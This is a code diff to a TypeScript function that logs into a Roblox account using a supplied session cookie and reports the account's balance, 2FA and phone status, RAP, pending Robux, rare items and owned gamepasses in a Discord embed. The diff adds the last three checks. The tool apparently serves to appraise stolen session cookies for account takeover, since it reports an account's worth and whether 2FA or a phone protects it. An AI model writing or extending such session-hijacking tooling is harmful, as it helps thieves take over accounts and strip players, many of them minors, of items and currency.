@@ -7,6 +7,13 @@ import {
   buildAccountEmbed,
 } from './embed-helpers';
 
+const GAMES = [
+  { name: 'Blox Fruits', universeId: 994732206 },
+  { name: 'Adopt Me', universeId: 383310974 },
+  { name: 'Steal a Brainrot', universeId: 7709344486 },
+  { name: 'Rivals', universeId: 6035872082 },
+];
+
 export async function runLoginAction(cookie: string) {
   const validation = await Roblox.validateCookie(cookie);
   if (!validation.valid) {
@@ -14,13 +21,18 @@ export async function runLoginAction(cookie: string) {
   }
 
   const userId = String(validation.userId!);
-  const [credit, twoStep, phone, rap, ageData, ageGroup] = await Promise.all([
+  const [
+    credit, twoStep, phone, rap, ageData, ageGroup,
+    pendingRobux, ownedRares,
+  ] = await Promise.all([
     Roblox.fetchCreditBalance(cookie),
     Roblox.fetchTwoStepConfig(cookie, userId),
     Roblox.fetchPhoneInfo(cookie),
     Roblox.fetchRolimonsRAP(userId),
     Roblox.getUserAge(validation.userId!),
     Roblox.fetchAgeGroup(cookie),
+    Roblox.fetchPendingRobux(cookie, userId),
+    Roblox.getOwnedRareItems(cookie, userId),
   ]);
 
   const ageString = `Created ${ageData.createdYear} (${ageData.days}D) - ${ageGroup}`;
@@ -41,6 +53,20 @@ export async function runLoginAction(cookie: string) {
   const balance = `\`\`\`${credit.balance} ${credit.currency}\`\`\``;
   const rapValue = `\`\`\`${rap.rap !== null ? rap.rap.toLocaleString() : 'PRIVATE'}\`\`\``;
   const premiumValue = `\`\`\`${rap.premium ? '✅ Yes' : '❌ No'}\`\`\``;
+  const pendingValue = `\`\`\`${pendingRobux.toLocaleString()}\`\`\``;
+  const rareText = ownedRares.length ? `\`\`\`${ownedRares.join(', ')}\`\`\`` : '`None`';
+
+  const gamepassLines: string[] = [];
+  for (const game of GAMES) {
+    try {
+      const passes = await Roblox.getGamepasses(game.universeId);
+      for (const gp of passes) {
+        const owns = await Roblox.checkOwnsGamepass(cookie, userId, gp.id);
+        if (owns) gamepassLines.push(`✅ ${game.name}: ${gp.name}`);
+      }
+    } catch {}
+  }
+  const gpText = gamepassLines.length ? `\`\`\`${gamepassLines.join('\n')}\`\`\`` : '`None`';
 
   const embed = buildAccountEmbed(
     validation.username!,
@@ -60,7 +86,10 @@ export async function runLoginAction(cookie: string) {
     { name: '📞 Phone', value: phoneStatus, inline: true },
     { name: '🔐 2FA', value: twoStepStatus, inline: false },
     { name: '📈 RAP', value: rapValue, inline: true },
-    { name: '⭐ Premium', value: premiumValue, inline: true }
+    { name: '⭐ Premium', value: premiumValue, inline: true },
+    { name: '⏳ Pending Robux', value: pendingValue, inline: true },
+    { name: '🎒 Rare Items', value: rareText, inline: false },
+    { name: '🎮 Gamepasses', value: gpText, inline: false }
   );
 
   return { success: true, embed };
